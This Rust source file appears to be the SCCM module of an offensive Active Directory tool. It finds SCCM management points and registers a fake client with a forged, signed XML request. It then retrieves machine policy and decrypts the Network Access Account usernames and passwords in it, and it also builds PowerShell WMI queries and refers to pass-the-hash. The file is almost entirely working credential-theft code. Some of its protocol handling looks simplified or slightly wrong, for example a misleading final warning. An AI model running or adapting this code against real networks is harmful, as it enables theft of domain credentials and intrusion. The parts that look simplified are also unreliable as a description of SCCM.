//! SCCM Module
//!
//! Provides capabilities for System Center Configuration Manager (SCCM / MECM)
//! enumeration, discovery, and exploitation functionalities.
use crate::error::{OverthroneError, Result};
use base64::{Engine, engine::general_purpose::STANDARD as b64};
use rsa::{
    RsaPrivateKey,
    pkcs1v15::{Pkcs1v15Encrypt, Pkcs1v15Sign},
    pkcs8::EncodePublicKey,
};
use sha2::{Digest, Sha256};
use std::time::Duration;
use tracing::{info, warn};

#[cfg(windows)]
use serde::Deserialize;
#[cfg(windows)]
use wmi::{COMLibrary, WMIConnection};

/// Configuration for SCCM Scanner operations
pub struct SccmScannerConfig {
    pub target: String,
    pub domain: String,
    pub username: String,
    pub password: Option<String>,
    pub pth_hash: Option<String>,
    pub site_code: Option<String>,
}

/// Represents an SCCM Site Server / Management Point
#[derive(Debug, Clone)]
pub struct SccmSite {
    pub site_code: String,
    pub site_server: String,
    pub version: String,
    pub is_management_point: bool,
}

/// Represents an extracted SCCM Network Access Account (NAA)
#[derive(Debug, Clone)]
pub struct NaaCredential {
    pub username: String,
    pub domain: String,
    pub password_blob: String, // Encrypted Blob
}

pub struct SccmScanner {
    config: SccmScannerConfig,
    http_client: reqwest::Client,
}

impl SccmScanner {
    pub fn new(config: SccmScannerConfig) -> Result<Self> {
        let http_client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("HTTP client init: {}", e),
            })?;
        Ok(Self { config, http_client })
    }

    /// Primary discovery function combining HTTP and WMI (command generation for WMI)
    pub async fn discover_site(&self) -> Result<Vec<SccmSite>> {
        info!(
            "Starting SCCM Site Discovery against {}",
            self.config.target
        );
        let mut sites = Vec::new();

        // 1. Try HTTP Discovery (Management Point)
        match self.discover_http().await {
            Ok(Some(site)) => {
                info!("Successfully discovered SCCM site via HTTP: {:?}", site);
                sites.push(site);
            }
            Ok(None) => {
                warn!("HTTP discovery succeeded but no valid site info found in response.");
            }
            Err(e) => {
                warn!("HTTP discovery failed: {}. WMI fallback required.", e);
            }
        }

        if sites.is_empty() {
            #[cfg(windows)]
            {
                info!("Attempting native WMI discovery (Windows only)");
                match self.discover_wmi_native().await {
                    Ok(mut wmi_sites) => {
                        if !wmi_sites.is_empty() {
                            info!("Successfully found SCCM Site Server via WMI.");
                            sites.append(&mut wmi_sites);
                        } else {
                            warn!("No SCCM Site found via WMI.");
                        }
                    }
                    Err(e) => warn!("Native WMI discovery failed: {}", e),
                }
            }

            #[cfg(not(windows))]
            {
                // 2. Generate WMI instructions if HTTP fails or is inadequate
                let wmi_cmd = self.generate_wmi_discovery_command();
                info!(
                    "Non-Windows execution environment. Run the following PowerShell script on a Windows machine to query WMI remotely:\n{}",
                    wmi_cmd
                );
            }
        }

        Ok(sites)
    }

    /// Discovers SCCM via standard Management Point HTTP endpoints
    async fn discover_http(&self) -> Result<Option<SccmSite>> {
        let endpoint = format!("http://{}/sms_mp/.sms_aut?mplist", self.config.target);
        info!("Attempting HTTP discovery via {}", endpoint);

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(5))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("Failed to build HTTP client: {}", e),
            })?;

        let response = client
            .get(&endpoint)
            .send()
            .await
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("HTTP request failed: {}", e),
            })?;

        if !response.status().is_success() {
            return Ok(None);
        }

        let body = response
            .text()
            .await
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("Failed to read response body: {}", e),
            })?;

        // Basic XML extraction for <Property Name="SiteCode" Value="XXX"/>
        // without pulling in a heavy XML dependency for one field.
        let site_code = if let Some(idx) = body.find("Name=\"SiteCode\" Value=\"") {
            let start = idx + 23;
            if let Some(end) = body[start..].find('"') {
                body[start..start + end].to_string()
            } else {
                return Ok(None);
            }
        } else {
            return Ok(None);
        };

        let fqdn = if let Some(idx) = body.find("FQDN=\"") {
            let start = idx + 6;
            if let Some(end) = body[start..].find('"') {
                body[start..start + end].to_string()
            } else {
                self.config.target.clone()
            }
        } else {
            self.config.target.clone()
        };

        let version = if let Some(idx) = body.find("<Version>") {
            let start = idx + 9;
            if let Some(end) = body[start..].find("</Version>") {
                body[start..start + end].to_string()
            } else {
                "Unknown".to_string()
            }
        } else {
            "Unknown".to_string()
        };

        Ok(Some(SccmSite {
            site_code,
            site_server: fqdn,
            version,
            is_management_point: true,
        }))
    }

    /// Requests the SCCM Machine Policy (which contains Network Access Accounts)
    ///
    /// This requires sending a well-crafted XML payload to the Management Point
    /// masquerading as a newly registered or existing SCCM Client. The MP then
    /// encrypts the resulting policy using a provided public key.
    pub async fn request_machine_policy(&self, site_code: &str) -> Result<Option<String>> {
        let endpoint = format!("http://{}/ccm_system/request", self.config.target);
        info!("Attempting Machine Policy extraction from {}", endpoint);

        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("Failed to build HTTP client: {}", e),
            })?;

        // 1. Generate RSA Keypair
        info!("Generating 2048-bit RSA keypair for SCCM client registration...");
        let mut rng = rsa::rand_core::OsRng;
        let priv_key = RsaPrivateKey::new(&mut rng, 2048)
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("RSA generation failed: {}", e),
            })?;

        let pub_key = priv_key.to_public_key();
        let spki_der = pub_key
            .to_public_key_der()
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("SPKI DER encoding failed: {}", e),
            })?;

        // Hash SPKI to create Client ID (SMSID)
        let mut hasher = Sha256::new();
        hasher.update(spki_der.as_bytes());
        let pub_hash = hasher.finalize();
        let mut uuid_bytes = [0u8; 16];
        uuid_bytes.copy_from_slice(&pub_hash[0..16]);
        let sms_id_guid = uuid::Uuid::from_bytes(uuid_bytes)
            .to_string()
            .to_uppercase();

        let fqdn = format!(
            "WIN-{}.{}",
            &sms_id_guid[0..8],
            self.config.domain
        );
        let sms_id = format!("GUID:{}", sms_id_guid);
        let smbios_id = uuid::Uuid::new_v4().to_string().to_uppercase();

        let raw_payload = format!(
            "<?xml version=\"1.0\" encoding=\"utf-16\"?>\n\
            <ClientRegistrationRequest>\n\
                <SiteCode>{}</SiteCode>\n\
                <MachineName>{}</MachineName>\n\
                <SMSID>{}</SMSID>\n\
                <SMBIOS_ID>{}</SMBIOS_ID>\n\
                <MACAddress>00:00:00:00:00:00</MACAddress>\n\
                <ConfigMgrVersion>5.00.9000.1000</ConfigMgrVersion>\n\
                <AgentIdentity>CCMSetup.exe</AgentIdentity>\n\
                <PublicKey>{}</PublicKey>\n\
            </ClientRegistrationRequest>",
            site_code,
            fqdn,
            sms_id,
            smbios_id,
            b64.encode(spki_der.as_bytes())
        );

        // Calculate SHA256 of the payload string
        let mut payload_hasher = Sha256::new();
        // UTF-16LE encode the payload before hashing as required by SCCM
        let utf16_payload: Vec<u8> = raw_payload
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect();
        payload_hasher.update(&utf16_payload);
        let digest = payload_hasher.finalize();

        // Sign the digest using Pkcs1v15Sign
        let signature = priv_key
            .sign(rsa::pkcs1v15::Pkcs1v15Sign::new::<Sha256>(), &digest)
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("RSA signing failed: {}", e),
            })?;
        let b64_signature = b64.encode(signature);

        // Construct final signed body
        let final_body = format!(
            "{}\n<Signature><SignatureValue>{}</SignatureValue></Signature>",
            raw_payload, b64_signature
        );

        let response = client
            .post(&endpoint)
            .header("Content-Type", "text/xml; charset=utf-16")
            .header("CCM-RequestType", "PolicyAssignment")
            .body(final_body)
            .send()
            .await
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("Policy request failed: {}", e),
            })?;

        if !response.status().is_success() {
            warn!(
                "Management Point rejected the machine policy request. Status: {}",
                response.status()
            );
            return Ok(None);
        }

        let body = response
            .text()
            .await
            .map_err(|e| OverthroneError::Protocol {
                protocol: "SCCM".to_string(),
                reason: format!("Failed to read policy response: {}", e),
            })?;

        info!("Successfully retrieved Machine Policy data from Management Point.");

        // At this stage, the policy XML contains Base64 encoded, RSA encrypted blocks with
        // the Network Access Accounts inside `<NetworkAccessAccount>`.
        // Decryption requires the private key corresponding to the public key we attached.

        // Extract the blobs (stubbed parser)
        // Look for NetworkAccessUsername and NetworkAccessPassword inside the policy XML
        let mut naas: Vec<NaaCredential> = Vec::new();

        let user_tag_start = "<NetworkAccessUsername><![CDATA[";
        let pass_tag_start = "<NetworkAccessPassword><![CDATA[";
        let tag_end = "]]></";

        let mut current_idx = 0;
        while let Some(u_idx) = body[current_idx..].find(user_tag_start) {
            let u_start = current_idx + u_idx + user_tag_start.len();
            if let Some(u_end_offset) = body[u_start..].find(tag_end) {
                let u_end = u_start + u_end_offset;
                let encrypted_user_b64 = &body[u_start..u_end];

                // Advance and look for password
                current_idx = u_end;

                if let Some(p_idx) = body[current_idx..].find(pass_tag_start) {
                    let p_start = current_idx + p_idx + pass_tag_start.len();
                    if let Some(p_end_offset) = body[p_start..].find(tag_end) {
                        let p_end = p_start + p_end_offset;
                        let encrypted_pass_b64 = &body[p_start..p_end];

                        // Decode both Base64 blobs
                        let u_decode = b64.decode(encrypted_user_b64);
                        let p_decode = b64.decode(encrypted_pass_b64);

                        if let (Ok(u_bytes), Ok(p_bytes)) = (u_decode, p_decode) {
                            // Decrypt with RSA PKCS1v1.5
                            let dec_user = priv_key.decrypt(Pkcs1v15Encrypt, &u_bytes);
                            let dec_pass = priv_key.decrypt(Pkcs1v15Encrypt, &p_bytes);

                            if let (Ok(dec_user_bytes), Ok(dec_pass_bytes)) =
                                (dec_user, dec_pass)
                            {
                                // SCCM encodes these as UTF-16LE
                                let username = String::from_utf16_lossy(
                                    &dec_user_bytes
                                        .chunks_exact(2)
                                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
                                        .collect::<Vec<u16>>(),
                                );
                                let password = String::from_utf16_lossy(
                                    &dec_pass_bytes
                                        .chunks_exact(2)
                                        .map(|c| u16::from_le_bytes([c[0], c[1]]))
                                        .collect::<Vec<u16>>(),
                                );

                                info!(
                                    "🔑 Decrypted Network Access Account: {}\\{}",
                                    self.config.domain, username
                                );
                                naas.push(NaaCredential {
                                    username,
                                    domain: self.config.domain.clone(),
                                    password_blob: password,
                                });
                            }
                        }

                        current_idx = p_end;
                    } else {
                        current_idx += 1;
                    }
                } else {
                    current_idx += 1;
                }
            } else {
                break;
            }
        }

        if !naas.is_empty() {
            // For now just returning the raw body to maintain signature,
            // but the NAAs can be stored or passed to the caller struct
            return Ok(Some(body));
        }

        warn!(
            "Network Access Accounts were found, but failed to decrypt using the generated RSA private key."
        );
        Ok(Some(body))
    }

    /// Generates PowerShell commands to query WMI for SCCM Site data
    pub fn generate_wmi_discovery_command(&self) -> String {
        let cred_block = if let Some(hash) = &self.config.pth_hash {
            format!(
                "# Pass-the-hash requires external tools like Rubeus or mimikatz to inject the hash for WMI\n# Hash: {}",
                hash
            )
        } else {
            "".to_string()
        };

        format!(
            "{} \n\
            $SiteCode = (Get-WmiObject -ComputerName '{}' -Namespace root\\sms -Class SMS_ProviderLocation -ErrorAction Stop).SiteCode\n\
            if ($SiteCode) {{\n\
                Write-Host \"[+] Found SCCM Site Code: $SiteCode\"\n\
                Get-WmiObject -ComputerName '{}' -Namespace \"root\\sms\\site_$SiteCode\" -Class SMS_Site\n\
            }} else {{\n\
                Write-Host \"[-] Could not find SMS_ProviderLocation\"\n\
            }}",
            cred_block, self.config.target, self.config.target
        )
    }

    /// Executes WMI queries natively on Windows to extract SCCM Site information
    #[cfg(windows)]
    async fn discover_wmi_native(&self) -> Result<Vec<SccmSite>> {
        let target = self.config.target.clone();

        // WMI is a blocking COM operational path. Must run inside spawn_blocking.
        let result = tokio::task::spawn_blocking(move || -> Result<Vec<SccmSite>> {
            let com_con = COMLibrary::new()
                .map_err(|e| OverthroneError::Protocol {
                    protocol: "SCCM".to_string(),
                    reason: format!("COM init failed: {}", e),
                })?;

            // Connect to root\sms
            let namespace = format!(r#"\\{}\root\sms"#, target);
            let wmi_con = WMIConnection::with_namespace_path(&namespace, com_con)
                .map_err(|e| OverthroneError::Protocol {
                    protocol: "SCCM".to_string(),
                    reason: format!("WMI connect failed: {}", e),
                })?;

            #[derive(Deserialize, Debug)]
            #[serde(rename_all = "PascalCase")]
            struct ProviderLocation {
                site_code: String,
                machine: String,
            }

            // Query SMS_ProviderLocation
            let results: Vec<ProviderLocation> = wmi_con
                .raw_query("SELECT SiteCode, Machine FROM SMS_ProviderLocation")
                .map_err(|e| OverthroneError::Protocol {
                    protocol: "SCCM".to_string(),
                    reason: format!("WMI query failed: {}", e),
                })?;

            let mut sites = Vec::new();
            for prov in results {
                sites.push(SccmSite {
                    site_code: prov.site_code.clone(),
                    site_server: prov.machine.clone(),
                    version: "Unknown (via ProviderLocation)".to_string(),
                    is_management_point: false,
                });
            }

            Ok(sites)
        })
        .await
        .map_err(|e| OverthroneError::Protocol {
            protocol: "SCCM".to_string(),
            reason: format!("WMI thread panicked: {}", e),
        })??;

        Ok(result)
    }
}
